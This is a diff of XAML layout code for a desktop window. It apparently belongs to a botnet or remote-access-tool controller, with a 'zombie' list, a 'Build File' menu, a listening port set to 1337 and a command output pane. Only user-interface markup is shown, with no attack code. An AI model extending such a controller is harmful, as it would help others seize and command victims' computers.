@@ -21,7 +21,7 @@
             <ColumnDefinition Width="10"></ColumnDefinition>
         </Grid.ColumnDefinitions>
 
-       
+
         <ListView x:Name="zombieListView" Margin="0" Grid.Column="1" Grid.Row="2" Background="#FFF5F5F6">
             <ListView.ItemTemplate>
                 <DataTemplate>
@@ -49,11 +49,15 @@
         <ScrollViewer Grid.Column="1" Grid.Row="4">
             <TextBox IsReadOnly="True" x:Name="commandOutput" Margin="0"  TextWrapping="Wrap" Text="" Background="#2D0922" Foreground="#488F31"/>
         </ScrollViewer>
-        <Menu Grid.Column="0" Grid.ColumnSpan="3" VerticalAlignment="Top" Grid.Row="0" Background="#d50000" Foreground="White">
+        <StackPanel  Background="#FFD50000" Grid.Column="0" Grid.Row="0" Grid.ColumnSpan="3" Orientation="Horizontal">
+            <Menu VerticalAlignment="Top" Grid.Row="0" Foreground="White" Background="{x:Null}">
+                <MenuItem Header="Build File" Click="BuildFileItem_Click" Background="{x:Null}">
+                </MenuItem>
+            </Menu>
+            <TextBox x:Name="portTextBox" Text="1337"  VerticalAlignment="Bottom" Margin="10,0,10,2.4" TextChanged="TextBox_TextChanged"></TextBox>
+            <Button x:Name="listeningButton" Content="Start Listening" VerticalAlignment="Center" Margin="0,2,0,1.4" Click="listeningButton_Click"/>
+        </StackPanel>
 
-            <MenuItem Header="Build File" Click="BuildFileItem_Click" Background="{x:Null}">
-            </MenuItem>
-        </Menu>
 
     </Grid>
 </mah:MetroWindow>
